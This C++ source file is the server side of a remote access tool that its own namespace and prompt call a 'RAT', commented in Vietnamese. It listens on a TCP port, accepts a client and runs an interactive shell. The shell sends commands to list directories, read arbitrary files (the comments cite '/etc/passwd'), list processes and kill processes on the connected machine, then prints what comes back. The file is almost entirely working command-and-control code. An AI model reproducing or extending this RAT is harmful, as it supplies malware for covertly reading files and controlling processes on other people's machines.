#include "server.h"

#include <iostream>
#include <sstream>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>

namespace RAT
{
    // Khởi tạo Server với port
    Server::Server(int port)
        : server_fd_(-1), client_fd_(-1), port_(port), client_port_(0), is_running_(false) {}
    Server::~Server()
    {
        stop();
    }

    // Khởi tạo Socket, bind và listen
    bool Server::start()
    {
        // Tạo socket TCP IPv4
        server_fd_ = ::socket(AF_INET, SOCK_STREAM, 0);
        if (server_fd_ < 0)
        {
            std::cerr << Status::ERR << "Khong the tao server socket!\n";
            return false;
        }

        // Thiết lập SO_REUSEADDR để tránh lỗi "Address already in use" khi restart server nhanh
        int opt = 1;
        if (setsockopt(server_fd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
        {
            std::cerr << Status::ERR << "Loi setsockopt(SO_REUSEADDR)!\n";
            stop();
            return false;
        }

        // Cấu hình địa chỉ IP và port
        struct sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY; // Lắng nghe trên mọi card mạng
        server_addr.sin_port = htons(port_);

        // Bind socket với địa chỉ IP và port
        if (::bind(server_fd_, reinterpret_cast<struct sockaddr *>(&server_addr), sizeof(server_addr)) < 0)
        {
            std::cerr << Status::ERR << "Loi bind vao port " << port_ << "! (Kiem tra xem port co bi chiem dung khong)\n";
            stop();
            return false;
        }

        // Bắt đầu lắng nghe kết nối từ client (max 5)
        if (::listen(server_fd_, 5) < 0)
        {
            std::cerr << Status::ERR << "Loi listen tren socket!\n";
            stop();
            return false;
        }

        std::cout << Status::OK << "Server dang lang nghe tren port " << port_ << "...\n";
        return true;
    }

    // Kết nối client
    bool Server::wait_for_client()
    {
        // Kiểm tra socket server hợp lệ
        if (server_fd_ < 0)
            return false;

        std::cout << Status::INFO << "Dang cho Client ket noi...\n";

        // Chờ kết nối từ client
        struct sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);
        client_fd_ = ::accept(server_fd_, reinterpret_cast<struct sockaddr *>(&client_addr), &client_len);
        if (client_fd_ < 0)
        {
            std::cerr << Status::ERR << "Loi accept ket noi tu Client!\n";
            return false;
        }
        
        // Lấy thông tin IP và port của client
        char ip_buffer[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, ip_buffer, sizeof(ip_buffer));
        client_ip_ = ip_buffer;
        client_port_ = ntohs(client_addr.sin_port);

        std::cout << Status::OK << "Client da ket noi tu: " << client_ip_ << ":" << client_port_ << "\n";
        return true;
    }

    // Kiểm tra tính hợp lệ của command trước khi gửi qua mạng
    bool Server::validate_and_process_command(const std::string &line, std::string &cmd_name, std::string &cmd_args)
    {
        std::istringstream iss(line);
        if (!(iss >> cmd_name))
        {
            return false; // Dòng trống
        }
        // Đọc phần tham số còn lại (nếu có)
        std::getline(iss >> std::ws, cmd_args);

        // 1. Lệnh HELP:
        if (cmd_name == Command::HELP)
        {
            std::cout << HELP_TEXT;
            return false; // Không gửi sang client
        }
        // 2. Lệnh LIST_DIR: nếu người dùng không nhập đường dẫn thì mặc định là thư mục hiện tại
        if (cmd_name == Command::LIST_DIR)
        {
            if (cmd_args.empty())
            {
                cmd_args = ".";
            }
            return true;
        }
        // 3. Lệnh READ_FILE: bắt buộc phải có tên file / đường dẫn
        if (cmd_name == Command::READ_FILE)
        {
            if (cmd_args.empty())
            {
                std::cout << Status::ERR << "Cu phap dung: READ_FILE <path>\n";
                return false;
            }
            return true;
        }
        // 4. Lệnh LIST_PROC: không cần tham số
        if (cmd_name == Command::LIST_PROC)
        {
            return true;
        }
        // 5. Lệnh KILL_PROC: bắt buộc có PID là số
        if (cmd_name == Command::KILL_PROC)
        {
            if (cmd_args.empty())
            {
                std::cout << Status::ERR << "Cu phap dung: KILL_PROC <PID>\n";
                return false;
            }
            return true;
        }
        // 6. Lệnh EXIT: hợp lệ để gửi đi báo client tắt cùng
        if (cmd_name == Command::EXIT)
        {
            return true;
        }
        // Lệnh không nhận diện được
        std::cout << Status::ERR << "Lenh khong hop le! 'HELP' de xem danh sach lenh.\n";
        return false;
    }

    // RAT Shell
    void Server::run_shell()
    {
        if (client_fd_ < 0)
        {
            std::cerr << Status::ERR << "Chua co Client ket noi!\n";
            return;
        }
        is_running_ = true;
        std::cout << Status::INFO << "'HELP' de xem cac lenh ho tro, 'EXIT' de thoat.\n\n";
        while (is_running_)
        {
            // In IP Client
            std::cout << "RAT-Shell [" << client_ip_ << "]> " << std::flush;
            std::string line;
            if (!std::getline(std::cin, line))
            {
                // Nhấn Ctrl+D hoặc lỗi cin
                break;
            }
            // Bỏ qua dòng trống
            if (line.empty())
            {
                continue;
            }
            std::string cmd_name;
            std::string cmd_args;

            // Kiểm tra và tiền xử lý lệnh
            if (!validate_and_process_command(line, cmd_name, cmd_args))
            {
                continue;
            }
            // Tái tạo lại chuỗi lệnh chuẩn để gửi đi (VD: "LIST_DIR ." hoặc "READ_FILE /etc/passwd")
            std::string full_cmd = cmd_name;
            if (!cmd_args.empty())
            {
                full_cmd += " " + cmd_args;
            }
            // Gửi lệnh sang Client
            if (!send_message(client_fd_, full_cmd))
            {
                std::cerr << Status::ERR << "Mat ket noi toi Client (loi gui lenh)!\n";
                break;
            }
            // Nếu lệnh là EXIT -> kết thúc vòng lặp ngay sau khi gửi
            if (cmd_name == Command::EXIT)
            {
                std::cout << Status::INFO << "Dang dong phien lam viec voi Client...\n";
                break;
            }
            // Nhận kết quả phản hồi từ Client
            std::string response;
            if (!recv_message(client_fd_, response))
            {
                std::cerr << Status::ERR << "Mat ket noi toi Client (khong nhan duoc phan hoi)!\n";
                break;
            }
            // In kết quả 
            std::cout << response << "\n";
        }
        // Đóng socket client khi kết thúc phiên shell
        close_socket(client_fd_);
        is_running_ = false;
    }

    // Đóng socket
    void Server::stop()
    {
        close_socket(client_fd_);
        close_socket(server_fd_);
        is_running_ = false;
    }
}